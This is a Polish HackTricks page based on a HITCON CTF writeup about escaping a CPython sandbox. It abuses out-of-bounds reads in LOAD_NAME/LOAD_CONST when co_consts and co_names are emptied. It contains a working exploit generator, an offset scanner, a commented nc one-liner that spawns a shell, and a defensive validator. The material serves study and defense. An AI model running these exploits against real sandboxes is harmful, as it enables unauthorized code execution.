# OOB Read opcode LOAD_NAME / LOAD_CONST

{{#include ../../../banners/hacktricks-training.md}}

**Ta informacja pochodzi** [**z tego writeupu**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Możemy użyć funkcji OOB read w opcode LOAD_NAME / LOAD_CONST, aby uzyskać dostęp do pewnego symbolu w pamięci. Oznacza to, że możemy użyć triku takiego jak `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)`, aby uzyskać wybrany symbol (na przykład nazwę funkcji).

Następnie wystarczy przygotować exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

Kod źródłowy jest bardzo krótki i zawiera tylko 4 linie!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Możesz wprowadzić dowolny kod Python, który zostanie skompilowany do [obiektu kodu Python](https://docs.python.org/3/c-api/code.html). Jednak `co_consts` i `co_names` tego obiektu kodu zostaną zastąpione pustą krotką przed wykonaniem tego obiektu kodu za pomocą `eval`.

W ten sposób każde wyrażenie zawierające consts (np. liczby, stringi itp.) lub names (np. zmienne, funkcje) może ostatecznie spowodować segmentation fault.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Jak dochodzi do segfault?

Zacznijmy od prostego przykładu: `[a, b, c]` może zostać skompilowane do następującego bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ale co się stanie, jeśli `co_names` stanie się pustą krotką? Opcode `LOAD_NAME 2` nadal zostanie wykonany i spróbuje odczytać wartość z adresu pamięci, pod którym pierwotnie powinna się znajdować. Tak, jest to „funkcja” odczytu poza zakresem (OOB).

Podstawowa koncepcja rozwiązania jest prosta. Niektóre opcodes w CPython, na przykład `LOAD_NAME` i `LOAD_CONST`, są podatne (?) na odczyt poza zakresem (OOB).

Pobierają obiekt z indeksu `oparg` z krotki `consts` lub `names` (tak właśnie nazywane są wewnętrznie `co_consts` i `co_names`). Możemy odwołać się do poniższego krótkiego fragmentu dotyczącego `LOAD_CONST`, aby zobaczyć, co CPython robi podczas przetwarzania opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
W ten sposób możemy użyć funkcji OOB, aby uzyskać „name” z dowolnego offsetu pamięci. Aby upewnić się, jaką ma nazwę i jaki jest jego offset, po prostu próbuj kolejno `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Możesz znaleźć coś przy oparg > 700. Oczywiście możesz także użyć gdb, aby przyjrzeć się układowi pamięci, ale nie sądzę, żeby było to łatwiejsze?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Gdy uzyskamy te użyteczne offsety dla names / consts, jak _dokładnie_ uzyskać name / const z tego offsetu i go użyć? Oto pewna sztuczka:\
Załóżmy, że możemy uzyskać name `__getattribute__` z offsetu 5 (`LOAD_NAME 5`) przy `co_names=()`, a następnie wykonajmy następujące czynności:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Zauważ, że nie ma potrzeby nazywania go `__getattribute__`; możesz nadać mu krótszą lub bardziej nietypową nazwę.

Możesz zrozumieć przyczynę, po prostu wyświetlając jego bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Zauważ, że `LOAD_ATTR` również pobiera nazwę z `co_names`. Python ładuje nazwy z tego samego offsetu, jeśli nazwa jest taka sama, więc drugie `__getattribute__` nadal jest ładowane z offset=5. Korzystając z tej funkcji, możemy użyć dowolnej nazwy, gdy nazwa znajduje się w pobliżu w pamięci.

Generowanie liczb powinno być trywialne:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Nie użyłem consts z powodu limitu długości.

Najpierw skrypt, który pozwoli nam znaleźć te offsety nazw.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Poniższe służy do wygenerowania rzeczywistego exploita w Pythonie.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Zasadniczo wykonuje następujące czynności; w przypadku tych ciągów znaków pobieramy je z metody `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Uwagi dotyczące wersji i dotknięte opcodes (Python 3.11–3.13)

- Opkody bytecode CPython nadal indeksują tuple `co_consts` i `co_names` za pomocą operandów całkowitych. Jeśli attacker może wymusić, aby te tuple były puste (lub mniejsze niż maksymalny indeks używany przez bytecode), interpreter odczyta pamięć poza zakresem dla danego indeksu, zwracając dowolny wskaźnik PyObject z pobliskiej pamięci. Istotne opkody obejmują co najmniej:
- `LOAD_CONST consti` → odczytuje `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → odczytują names z `co_names[...]` (dla 3.11+ należy pamiętać, że `LOAD_ATTR`/`LOAD_GLOBAL` przechowują bity flag w najmłodszym bicie; rzeczywisty indeks to `namei >> 1`). Szczegółowe znaczenie dla poszczególnych wersji znajdziesz w dokumentacji disassemblera. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ wprowadził adaptive/inline caches, które dodają ukryte wpisy `CACHE` między instrukcjami. Nie zmienia to primitive OOB; oznacza jedynie, że podczas ręcznego tworzenia bytecode musisz uwzględnić te wpisy cache przy budowaniu `co_code`.

Praktyczna konsekwencja: technika opisana na tej stronie nadal działa w CPython 3.11, 3.12 i 3.13, gdy możesz kontrolować code object (np. za pomocą `CodeType.replace(...)`) i zmniejszyć `co_consts`/`co_names`.

### Szybki scanner przydatnych indeksów OOB (kompatybilny z 3.11+/3.12+)

Jeśli wolisz wyszukiwać interesujące obiekty bezpośrednio z bytecode zamiast z high-level source, możesz generować minimalne code objects i brute force'ować indeksy. Poniższy helper automatycznie wstawia inline caches, gdy jest to wymagane.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Uwagi
- Aby zamiast tego sprawdzać nazwy, zamień `LOAD_CONST` na `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` i odpowiednio dostosuj użycie stosu.
- W razie potrzeby użyj `EXTENDED_ARG` lub wielu bajtów `arg`, aby uzyskać dostęp do indeksów >255. Podczas tworzenia za pomocą `dis`, jak powyżej, kontrolujesz tylko niższy bajt; w przypadku większych indeksów skonstruuj surowe bajty samodzielnie lub podziel atak na wiele ładowań.

### Minimalny wzorzec RCE wyłącznie z użyciem bytecode (OOB w co_consts → builtins → eval/input)

Po zidentyfikowaniu indeksu `co_consts`, który wskazuje na moduł builtins, możesz odtworzyć `eval(input())` bez używania `co_names`, manipulując stosem:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
To podejście jest przydatne w challenges, które dają bezpośrednią kontrolę nad `co_code`, jednocześnie wymuszając `co_consts=()` i `co_names=()` (np. BCTF 2024 „awpcode”). Pozwala uniknąć sztuczek na poziomie source code i utrzymać mały rozmiar payloadu dzięki wykorzystaniu operacji stosu bytecode oraz builderów krotek.

### Kontrole obronne i środki zaradcze dla sandboxów

Jeśli tworzysz Pythonowy „sandbox”, który kompiluje/wykonuje niezaufany kod lub manipuluje code objects, nie polegaj na tym, że CPython sprawdzi zakres indeksów krotek używanych przez bytecode. Zamiast tego samodzielnie waliduj code objects przed ich wykonaniem.

Praktyczny validator (odrzuca dostęp OOB do co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Dodatkowe pomysły dotyczące mitigation
- Nie zezwalaj na dowolne `CodeType.replace(...)` na niezaufanych danych wejściowych lub dodaj ścisłe kontrole strukturalne wynikowego obiektu kodu.
- Rozważ uruchamianie niezaufanego kodu w osobnym procesie z sandboxingiem na poziomie systemu operacyjnego (seccomp, job objects, kontenery), zamiast polegać na semantyce CPython.

## References

- [1] [writeup Splitline z HITCON CTF 2022 „V O I D” (źródło tej techniki i ogólny łańcuch exploita)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Dokumentacja disassemblera Pythona (semantyka indeksów dla LOAD_CONST/LOAD_NAME/itp. oraz flagi najniższego bitu dla `LOAD_ATTR`/`LOAD_GLOBAL` w wersji 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
